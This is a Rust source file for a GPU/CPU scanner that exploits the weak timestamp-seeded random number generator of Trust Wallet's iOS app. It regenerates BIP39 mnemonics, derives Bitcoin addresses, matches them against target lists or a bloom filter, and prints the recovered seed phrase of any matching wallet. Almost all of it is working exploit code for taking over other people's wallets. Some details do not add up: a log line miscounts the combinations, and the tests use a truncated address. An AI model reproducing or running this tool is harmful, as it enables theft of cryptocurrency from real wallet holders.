use anyhow::{Context, Result};
use bip39::Mnemonic;
use bitcoin::bip32::{DerivationPath, Xpriv};
use bitcoin::key::CompressedPublicKey;
use bitcoin::secp256k1::{All, Secp256k1};
use bitcoin::{Address, Network, XOnlyPublicKey};
use bitcoin::key::TapTweak;
use std::collections::HashMap;
use std::path::Path;
use std::str::FromStr;
use tracing::{info, warn};

#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;

pub const CVE_2024_23660_START: u32 = 1_498_780_800;
pub const CVE_2024_23660_END:   u32 = 1_685_836_800;
pub const CVE_2024_23660_LIKELY_START: u32 = 1_640_000_000;
pub const CVE_2024_23660_LIKELY_END:   u32 = 1_685_836_800;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum EntropyStrategy {
    BytePerCallAnd,
    BytePerCallMod,
}

impl EntropyStrategy {
    fn fill_entropy(self, rng: &mut MinstdRand0, buf: &mut [u8; 16]) {
        match self {
            EntropyStrategy::BytePerCallAnd => {
                for byte in buf.iter_mut() { *byte = (rng.next_u32() & 0xFF) as u8; }
            }
            EntropyStrategy::BytePerCallMod => {
                for byte in buf.iter_mut() { *byte = (rng.next_u32() % 255) as u8; }
            }
        }
    }
    fn name(self) -> &'static str {
        match self {
            EntropyStrategy::BytePerCallAnd => "BytePerCallAnd (val & 0xFF)",
            EntropyStrategy::BytePerCallMod => "BytePerCallMod (val % 0xFF)",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum AddrType { P2Pkh, P2Wpkh, P2ShP2Wpkh, P2Tr }

fn decode_combo(combo: u32) -> (EntropyStrategy, &'static str, AddrType) {
    match combo {
        0 => (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", AddrType::P2Pkh),
        1 => (EntropyStrategy::BytePerCallMod, "m/44'/0'/0'/0/0", AddrType::P2Pkh),
        2 => (EntropyStrategy::BytePerCallAnd, "m/84'/0'/0'/0/0", AddrType::P2Wpkh),
        3 => (EntropyStrategy::BytePerCallMod, "m/84'/0'/0'/0/0", AddrType::P2Wpkh),
        4 => (EntropyStrategy::BytePerCallAnd, "m/49'/0'/0'/0/0", AddrType::P2ShP2Wpkh),
        5 => (EntropyStrategy::BytePerCallMod, "m/49'/0'/0'/0/0", AddrType::P2ShP2Wpkh),
        6 => (EntropyStrategy::BytePerCallAnd, "m/86'/0'/0'/0/0", AddrType::P2Tr),
        7 => (EntropyStrategy::BytePerCallMod, "m/86'/0'/0'/0/0", AddrType::P2Tr),
        _ => (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", AddrType::P2Pkh),
    }
}

pub fn run(target: &str, start_ts: u32, end_ts: u32) -> Result<()> {
    run_multi(&[target.to_string()], start_ts, end_ts)
}

pub fn run_multi_file(path: &Path, start_ts: u32, end_ts: u32) -> Result<()> {
    let targets = load_targets_from_csv(path)?;
    run_multi(&targets, start_ts, end_ts)
}

pub fn run_multi(targets: &[String], start_ts: u32, end_ts: u32) -> Result<()> {
    if targets.is_empty() {
        anyhow::bail!("No target addresses provided.");
    }

    info!("Trust Wallet (iOS/LCG) Vulnerability Scanner — {} target(s)", targets.len());
    info!("PRNG : minstd_rand0 (LCG, a=16807, m=2^31-1)");
    info!("Range: {} – {}", start_ts, end_ts);

    // ── GPU path ─────────────────────────────────────────────────────────────
    #[cfg(feature = "gpu")]
    {
        let mut hash160s: Vec<[u8; 20]> = Vec::with_capacity(targets.len());
        let mut valid_targets: Vec<&str> = Vec::with_capacity(targets.len());

        for addr_str in targets {
            match address_to_hash160(addr_str) {
                Some(h) => { hash160s.push(h); valid_targets.push(addr_str.as_str()); }
                None => {
                    warn!("[GPU] Skipping {:?} — unsupported type", addr_str);
                }
            }
        }

        if valid_targets.is_empty() {
            anyhow::bail!("No supported target addresses after filtering.");
        }

        info!(
            "[GPU] {} valid target(s) × {} timestamps × 8 combos",
            valid_targets.len(),
            end_ts.saturating_sub(start_ts) + 1
        );

        let t0     = std::time::Instant::now();
        let solver = GpuSolver::new()?;
        info!("[GPU] Solver initialised");

        let secp    = Secp256k1::new();
        let network = Network::Bitcoin;

        // ── Single GPU pass for ALL targets ──────────────────────────────────
        let hits = solver.compute_trust_wallet_lcg_crack_mt(start_ts, end_ts, &hash160s)?;

        info!(
            "[GPU] Scan complete in {:.2}s — {} candidate(s) to verify",
            t0.elapsed().as_secs_f64(),
            hits.len()
        );

        for (timestamp, combo, target_idx) in &hits {
            let target_addr = valid_targets[*target_idx as usize];
            let (strategy, path_str, addr_type) = decode_combo(*combo);

            let mut rng     = MinstdRand0::new(*timestamp);
            let mut entropy = [0u8; 16];
            strategy.fill_entropy(&mut rng, &mut entropy);

            let mnemonic = match Mnemonic::from_entropy(&entropy) {
                Ok(m)  => m,
                Err(e) => { warn!("[GPU] bad entropy ts={}: {}", timestamp, e); continue; }
            };
            let seed  = mnemonic.to_seed("");
            let root  = match Xpriv::new_master(network, &seed) {
                Ok(r)  => r,
                Err(e) => { warn!("[GPU] master key ts={}: {}", timestamp, e); continue; }
            };
            let path  = DerivationPath::from_str(path_str)?;
            let child = match root.derive_priv(&secp, &path) {
                Ok(c)  => c,
                Err(e) => { warn!("[GPU] derive ts={}: {}", timestamp, e); continue; }
            };

            let address_str = match derive_address(&secp, &child, addr_type, network) {
                Some(a) => a,
                None    => { warn!("[GPU] derive_address failed ts={} combo={}", timestamp, combo); continue; }
            };

            if address_str == target_addr {
                warn!("\n\u{1F3AF} [VERIFIED] FOUND MATCH!");
                warn!("  Target    : {}", target_addr);
                warn!("  Timestamp : {}", timestamp);
                warn!("  Strategy  : {}", strategy.name());
                warn!("  Path      : {}", path_str);
                warn!("  AddrType  : {:?}", addr_type);
                warn!("  Mnemonic  : {}", mnemonic);
            } else {
                warn!(
                    "[GPU] False positive ts={} combo={} target_idx={} (got={})",
                    timestamp, combo, target_idx, address_str
                );
            }
        }

        info!("[GPU] All targets scanned in {:.2}s.", t0.elapsed().as_secs_f64());
        return Ok(());
    }

    // ── CPU fallback ──────────────────────────────────────────────────────────
    #[cfg(not(feature = "gpu"))]
    {
        let target_map: HashMap<&str, usize> =
            targets.iter().enumerate().map(|(i, s)| (s.as_str(), i)).collect();

        let secp    = Secp256k1::new();
        let network = Network::Bitcoin;

        let paths: &[(&str, AddrType)] = &[
            ("m/44'/0'/0'/0/0", AddrType::P2Pkh),
            ("m/84'/0'/0'/0/0", AddrType::P2Wpkh),
            ("m/49'/0'/0'/0/0", AddrType::P2ShP2Wpkh),
            ("m/86'/0'/0'/0/0", AddrType::P2Tr),
        ];
        let strategies = [EntropyStrategy::BytePerCallAnd, EntropyStrategy::BytePerCallMod];

        let mut found_any = false;
        let mut checked   = 0u64;
        let t0            = std::time::Instant::now();

        info!(
            "[CPU] Scanning {} timestamps × 2 strategies × 4 paths × {} target(s)...",
            end_ts.saturating_sub(start_ts) + 1,
            targets.len()
        );

        'outer: for t in start_ts..=end_ts {
            for strategy in &strategies {
                let mut rng     = MinstdRand0::new(t);
                let mut entropy = [0u8; 16];
                strategy.fill_entropy(&mut rng, &mut entropy);

                let mnemonic = match Mnemonic::from_entropy(&entropy) {
                    Ok(m)  => m,
                    Err(_) => continue,
                };
                let seed = mnemonic.to_seed("");
                let root = match Xpriv::new_master(network, &seed) {
                    Ok(r)  => r,
                    Err(_) => continue,
                };

                for &(path_str, addr_type) in paths {
                    let path  = match DerivationPath::from_str(path_str) {
                        Ok(p)  => p, Err(_) => continue,
                    };
                    let child = match root.derive_priv(&secp, &path) {
                        Ok(c)  => c, Err(_) => continue,
                    };

                    let address_str = match derive_address(&secp, &child, addr_type, network) {
                        Some(a) => a,
                        None    => continue,
                    };

                    if let Some(&_idx) = target_map.get(address_str.as_str()) {
                        warn!("\n\u{1F3AF} FOUND MATCH!");
                        warn!("  Target    : {}", address_str);
                        warn!("  Timestamp : {}", t);
                        warn!("  Strategy  : {}", strategy.name());
                        warn!("  Path      : {}", path_str);
                        warn!("  AddrType  : {:?}", addr_type);
                        warn!("  Mnemonic  : {}", mnemonic);
                        found_any = true;
                        if targets.len() == 1 { break 'outer; }
                    }
                }
            }
            checked += 1;
            if checked % 500_000 == 0 {
                info!("[CPU] {} timestamps scanned ({:.1}s)", checked, t0.elapsed().as_secs_f64());
            }
        }

        if !found_any {
            info!("[CPU] Scan complete ({} timestamps, {:.2}s). No match found.", checked, t0.elapsed().as_secs_f64());
        }
        Ok(())
    }
}

// ─── Bloom filter scan ───────────────────────────────────────────────────────

#[cfg(feature = "gpu")]
pub fn run_bloom(
    bloom_path: &Path,
    csv_path: &Path,
    start_ts: u32,
    end_ts: u32,
) -> Result<()> {
    info!("[BLOOM] Loading: {}", bloom_path.display());
    let t_io = std::time::Instant::now();
    let bloom_data = std::fs::read(bloom_path)
        .with_context(|| format!("Cannot read bloom filter: {}", bloom_path.display()))?;
    info!("[BLOOM] Loaded {} MB in {:.2}s", bloom_data.len() / 1_048_576, t_io.elapsed().as_secs_f64());

    let targets = load_targets_from_csv(csv_path)?;
    let network = Network::Bitcoin;
    let mut h160_to_addr: HashMap<[u8; 20], String> = HashMap::with_capacity(targets.len());
    for addr_str in &targets {
        if let Some(h160) = address_to_hash160(addr_str) {
            h160_to_addr.insert(h160, addr_str.clone());
        }
    }
    info!("[BLOOM] Verification map: {} hash160 entries", h160_to_addr.len());
    info!("[BLOOM] Range: {} – {} ({} timestamps × 6 combos)",
        start_ts, end_ts, end_ts.saturating_sub(start_ts) + 1);

    let t0     = std::time::Instant::now();
    let solver = GpuSolver::new()?;
    info!("[BLOOM] GPU solver initialised (uploading bloom buffer...)");

    let hits = solver.compute_trust_wallet_lcg_bloom(start_ts, end_ts, &bloom_data)?;
    info!("[BLOOM] GPU scan: {:.2}s, bloom candidates: {}", t0.elapsed().as_secs_f64(), hits.len());

    if hits.is_empty() {
        info!("[BLOOM] No candidates found. Scan complete.");
        return Ok(());
    }

    let secp    = Secp256k1::new();
    let mut verified = 0usize;

    for (timestamp, combo) in &hits {
        let (strategy, path_str, addr_type) = decode_combo(*combo);
        let mut rng     = MinstdRand0::new(*timestamp);
        let mut entropy = [0u8; 16];
        strategy.fill_entropy(&mut rng, &mut entropy);

        let mnemonic = match Mnemonic::from_entropy(&entropy) {
            Ok(m)  => m,
            Err(e) => { warn!("[BLOOM] bad entropy ts={}: {}", timestamp, e); continue; }
        };
        let seed  = mnemonic.to_seed("");
        let root  = match Xpriv::new_master(network, &seed) {
            Ok(r)  => r,
            Err(e) => { warn!("[BLOOM] master key ts={}: {}", timestamp, e); continue; }
        };
        let path  = DerivationPath::from_str(path_str)?;
        let child = match root.derive_priv(&secp, &path) {
            Ok(c)  => c,
            Err(e) => { warn!("[BLOOM] derive ts={}: {}", timestamp, e); continue; }
        };

        let h160 = match derive_hash160(&secp, &child, addr_type, network) {
            Some(h) => h,
            None    => { warn!("[BLOOM] hash160 failed ts={} combo={}", timestamp, combo); continue; }
        };

        if let Some(addr_str) = h160_to_addr.get(&h160) {
            warn!("\n\u{1F3AF} [BLOOM VERIFIED] FOUND MATCH!");
            warn!("  Address   : {}", addr_str);
            warn!("  Timestamp : {}", timestamp);
            warn!("  Strategy  : {}", strategy.name());
            warn!("  Path      : {}", path_str);
            warn!("  AddrType  : {:?}", addr_type);
            warn!("  Mnemonic  : {}", mnemonic);
            verified += 1;
        } else {
            warn!("[BLOOM] False positive: ts={} combo={}", timestamp, combo);
        }
    }

    info!("[BLOOM] Done. Verified: {}/{} candidates. Total: {:.2}s",
        verified, hits.len(), t0.elapsed().as_secs_f64());
    Ok(())
}

// ─── CSV loader ──────────────────────────────────────────────────────────────

pub fn load_targets_from_csv(path: &Path) -> Result<Vec<String>> {
    use std::fs::File;
    use std::io::{BufRead, BufReader};

    let file   = File::open(path).with_context(|| format!("Cannot open: {}", path.display()))?;
    let reader = BufReader::new(file);
    let network = Network::Bitcoin;

    let mut addresses: Vec<String>                       = Vec::new();
    let mut seen:      std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut line_no:   usize                             = 0;

    for line in reader.lines() {
        line_no += 1;
        let line    = line.with_context(|| format!("I/O error at line {}", line_no))?;
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') { continue; }

        let addr = trimmed.splitn(2, |c| c == ',' || c == '\t' || c == ' ').next().unwrap_or(trimmed).trim();
        if addr.is_empty() { continue; }

        let valid = Address::from_str(addr)
            .ok()
            .and_then(|a| a.require_network(network).ok())
            .map(|a| {
                let s = a.script_pubkey();
                s.is_p2pkh() || s.is_p2sh() || s.is_p2wpkh() || s.is_p2tr()
            })
            .unwrap_or(false);

        if valid {
            let owned = addr.to_string();
            if seen.insert(owned.clone()) { addresses.push(owned); }
        } else {
            warn!("[CSV] Line {}: skipping {:?}", line_no, addr);
        }
    }

    if addresses.is_empty() {
        anyhow::bail!("No valid Bitcoin mainnet addresses found in {}", path.display());
    }
    info!("[CSV] Loaded {} unique target address(es) from {}", addresses.len(), path.display());
    Ok(addresses)
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

/// Extract a 20-byte key for GPU comparison.
/// For P2TR (bc1p): HASH160(x-only-pubkey) — matches what the GPU kernel computes
/// via taproot_identifier().
pub(crate) fn address_to_hash160(addr_str: &str) -> Option<[u8; 20]> {
    let address = Address::from_str(addr_str).ok()?.assume_checked();
    let script  = address.script_pubkey();
    let bytes   = script.as_bytes();
    if      script.is_p2pkh()  && bytes.len() == 25 { bytes[3..23].try_into().ok() }
    else if script.is_p2sh()   && bytes.len() == 23 { bytes[2..22].try_into().ok() }
    else if script.is_p2wpkh() && bytes.len() == 22 { bytes[2..22].try_into().ok() }
    else if script.is_p2tr()   && bytes.len() == 34 {
        // witness program = 32-byte tweaked x-only pubkey (bytes[2..34])
        // GPU kernel does HASH160(tweaked_x_only) for comparison → match that
        use bitcoin::hashes::{Hash, ripemd160, sha256};
        let sha  = sha256::Hash::hash(&bytes[2..34]);
        let h160 = ripemd160::Hash::hash(&sha[..]);
        Some(*h160.as_byte_array())
    }
    else { None }
}

/// Derive a Bitcoin address string from a child key.
fn derive_address(
    secp:      &Secp256k1<All>,
    child:     &Xpriv,
    addr_type: AddrType,
    network:   Network,
) -> Option<String> {
    Some(match addr_type {
        AddrType::P2Pkh => {
            let pk = child.to_keypair(secp).public_key();
            Address::p2pkh(bitcoin::PublicKey::new(pk), network).to_string()
        }
        AddrType::P2Wpkh => {
            let cpk = CompressedPublicKey::from_private_key(secp, &child.to_priv()).ok()?;
            Address::p2wpkh(&cpk, network).to_string()
        }
        AddrType::P2ShP2Wpkh => {
            let cpk = CompressedPublicKey::from_private_key(secp, &child.to_priv()).ok()?;
            Address::p2shwpkh(&cpk, network).to_string()
        }
        AddrType::P2Tr => {
            let keypair  = child.to_keypair(secp);
            let (xonly, _parity) = keypair.x_only_public_key();
            let tweaked  = xonly.tap_tweak(secp, None);
            Address::p2tr_tweaked(tweaked.0, network).to_string()
        }
    })
}

/// Derive HASH160 of the script-pubkey output (used by bloom verify).
/// For P2TR: HASH160(tweaked_x_only_32_bytes) — same as address_to_hash160.
#[cfg(feature = "gpu")]
fn derive_hash160(
    secp:      &Secp256k1<All>,
    child:     &Xpriv,
    addr_type: AddrType,
    network:   Network,
) -> Option<[u8; 20]> {
    let script = match addr_type {
        AddrType::P2Pkh => {
            let pk = child.to_keypair(secp).public_key();
            Address::p2pkh(bitcoin::PublicKey::new(pk), network).script_pubkey()
        }
        AddrType::P2Wpkh => {
            let cpk = CompressedPublicKey::from_private_key(secp, &child.to_priv()).ok()?;
            Address::p2wpkh(&cpk, network).script_pubkey()
        }
        AddrType::P2ShP2Wpkh => {
            let cpk = CompressedPublicKey::from_private_key(secp, &child.to_priv()).ok()?;
            Address::p2shwpkh(&cpk, network).script_pubkey()
        }
        AddrType::P2Tr => {
            let keypair = child.to_keypair(secp);
            let (xonly, _parity) = keypair.x_only_public_key();
            let tweaked = xonly.tap_tweak(secp, None);
            Address::p2tr_tweaked(tweaked.0, network).script_pubkey()
        }
    };
    let bytes = script.as_bytes();
    match addr_type {
        AddrType::P2Pkh      if bytes.len() == 25 => bytes[3..23].try_into().ok(),
        AddrType::P2Wpkh     if bytes.len() == 22 => bytes[2..22].try_into().ok(),
        AddrType::P2ShP2Wpkh if bytes.len() == 23 => bytes[2..22].try_into().ok(),
        AddrType::P2Tr       if bytes.len() == 34 => {
            use bitcoin::hashes::{Hash, ripemd160, sha256};
            let sha  = sha256::Hash::hash(&bytes[2..34]);
            let h160 = ripemd160::Hash::hash(&sha[..]);
            Some(*h160.as_byte_array())
        }
        _ => None,
    }
}

// ─── MinstdRand0 ─────────────────────────────────────────────────────────────

struct MinstdRand0 { state: u32 }

impl MinstdRand0 {
    fn new(seed: u32) -> Self {
        const M: u32 = 2_147_483_647;
        let s = seed % M;
        Self { state: if s == 0 { 1 } else { s } }
    }
    #[inline(always)]
    fn next_u32(&mut self) -> u32 {
        self.state = ((self.state as u64 * 16_807) % 2_147_483_647) as u32;
        self.state
    }
}

// ─── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_cve_window_constants_ordering() {
        assert!(CVE_2024_23660_START    < CVE_2024_23660_END);
        assert!(CVE_2024_23660_LIKELY_START >= CVE_2024_23660_START);
        assert!(CVE_2024_23660_LIKELY_END   <= CVE_2024_23660_END);
    }

    #[test]
    fn test_address_to_hash160_p2pkh() {
        let result = address_to_hash160("1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf");
        assert!(result.is_some());
        assert_eq!(hex::encode(result.unwrap()), "62e907b15cbf27d5425399ebf6f0fb50ebb88f18");
    }

    #[test]
    fn test_address_to_hash160_p2sh() {
        assert!(address_to_hash160("3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy").is_some());
    }

    #[test]
    fn test_address_to_hash160_p2tr_returns_some() {
        // bc1p genesis-style known Taproot address
        let result = address_to_hash160("bc1pcn47dt54myymwxpp6lgkvn32k57pu80gnr5auu7newrqpetd6cssfskzm9");
        assert!(result.is_some(), "P2TR address_to_hash160 must return Some");
    }

    #[test]
    fn test_address_to_hash160_invalid_returns_none() {
        assert!(address_to_hash160("not_an_address").is_none());
        assert!(address_to_hash160("0x742d35Cc6634C0532925a3b8D4C9B7E8f8E0dD44").is_none());
    }

    #[test]
    fn test_minstd_first_two_outputs() {
        let mut rng = MinstdRand0::new(1);
        assert_eq!(rng.next_u32(), 16_807);
        assert_eq!(rng.next_u32(), 282_475_249);
    }

    #[test]
    fn test_seed_zero_normalised_to_one() {
        let mut r0 = MinstdRand0::new(0);
        let mut r1 = MinstdRand0::new(1);
        assert_eq!(r0.next_u32(), r1.next_u32());
    }

    #[test]
    fn test_seed_m_normalised_to_one() {
        let mut rm = MinstdRand0::new(2_147_483_647);
        let mut r1 = MinstdRand0::new(1);
        assert_eq!(rm.next_u32(), r1.next_u32());
    }

    #[test]
    fn test_mod_strategy_never_produces_0xff() {
        for seed in [1u32, 99_999, 1_000_000, 1_498_780_800, 1_685_836_800] {
            let mut rng = MinstdRand0::new(seed);
            let mut buf = [0u8; 16];
            EntropyStrategy::BytePerCallMod.fill_entropy(&mut rng, &mut buf);
            assert!(!buf.contains(&0xFF), "BytePerCallMod produced 0xFF for seed {}", seed);
        }
    }

    #[test]
    fn test_and_mod_strategies_differ() {
        let seed = 1_700_000_000u32;
        let mut ba = [0u8; 16]; let mut bm = [0u8; 16];
        EntropyStrategy::BytePerCallAnd.fill_entropy(&mut MinstdRand0::new(seed), &mut ba);
        EntropyStrategy::BytePerCallMod.fill_entropy(&mut MinstdRand0::new(seed), &mut bm);
        assert_ne!(ba, bm);
    }

    #[test]
    fn test_decode_combo_coverage() {
        let expected: &[(EntropyStrategy, &str, AddrType)] = &[
            (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", AddrType::P2Pkh),
            (EntropyStrategy::BytePerCallMod, "m/44'/0'/0'/0/0", AddrType::P2Pkh),
            (EntropyStrategy::BytePerCallAnd, "m/84'/0'/0'/0/0", AddrType::P2Wpkh),
            (EntropyStrategy::BytePerCallMod, "m/84'/0'/0'/0/0", AddrType::P2Wpkh),
            (EntropyStrategy::BytePerCallAnd, "m/49'/0'/0'/0/0", AddrType::P2ShP2Wpkh),
            (EntropyStrategy::BytePerCallMod, "m/49'/0'/0'/0/0", AddrType::P2ShP2Wpkh),
            (EntropyStrategy::BytePerCallAnd, "m/86'/0'/0'/0/0", AddrType::P2Tr),
            (EntropyStrategy::BytePerCallMod, "m/86'/0'/0'/0/0", AddrType::P2Tr),
        ];
        for (i, &(ref exp_s, exp_p, exp_at)) in expected.iter().enumerate() {
            let (s, p, at) = decode_combo(i as u32);
            assert_eq!(s, *exp_s); assert_eq!(p, exp_p); assert_eq!(at, exp_at);
        }
    }

    fn write_temp_csv(content: &str) -> tempfile::NamedTempFile {
        let mut f = tempfile::NamedTempFile::new().expect("tempfile");
        write!(f, "{}", content).expect("write");
        f
    }

    #[test]
    fn test_csv_single_address_per_line() {
        let content = "# comment\n1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf NA\n\n1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf NA\n";
        let f = write_temp_csv(content);
        let result = load_targets_from_csv(f.path()).unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0], "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf");
    }

    #[test]
    fn test_csv_comma_separated() {
        let f = write_temp_csv("1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf,genesis\n");
        let result = load_targets_from_csv(f.path()).unwrap();
        assert_eq!(result[0], "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf");
    }

    #[test]
    fn test_csv_p2sh_address_accepted() {
        let f = write_temp_csv("3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy,label\n");
        let result = load_targets_from_csv(f.path()).unwrap();
        assert_eq!(result[0], "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy");
    }

    #[test]
    fn test_csv_p2tr_address_accepted() {
        let f = write_temp_csv("bc1pcn47dt54myymwxpp6lgkvn32k57pu80gnr5auu7newrqpetd6cssfskzm9,label\n");
        let result = load_targets_from_csv(f.path()).unwrap();
        assert_eq!(result[0], "bc1pcn47dt54myymwxpp6lgkvn32k57pu80gnr5auu7newrqpetd6cssfskzm9");
    }

    #[test]
    fn test_csv_all_invalid_returns_error() {
        let f = write_temp_csv("not_an_address\nETH_0x1234\n");
        assert!(load_targets_from_csv(f.path()).is_err());
    }

    #[test]
    fn test_bloom_bit_indices_known_vector() {
        let hash160 = hex::decode("0b51c1c3176d303854ac4b4d842ba70ba90884f4").unwrap();
        let expected: [u32; 5] = [0xC3C1510B, 0x38306D17, 0x4D4BAC54, 0x0BA72B84, 0xF48408A9];
        for i in 0..5usize {
            let idx = u32::from_le_bytes(hash160[i*4..i*4+4].try_into().unwrap());
            assert_eq!(idx, expected[i]);
        }
    }
}
